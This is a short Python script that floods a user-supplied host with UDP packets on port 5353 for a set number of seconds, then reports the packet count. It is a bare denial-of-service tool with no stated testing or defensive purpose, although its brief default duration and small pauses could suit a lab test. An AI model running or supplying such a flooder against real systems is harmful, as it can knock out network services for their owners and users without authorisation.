import socket, sys, time
dst = sys.argv[1]
dur = float(sys.argv[2]) if len(sys.argv) > 2 else 8
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
end = time.time() + dur
n = 0
while time.time() < end:
    s.sendto(b'flood', (dst, 5353))
    n += 1
    if n % 100 == 0:
        time.sleep(0.01)
print("flood finished, sent", n, "packets in", dur, "s")
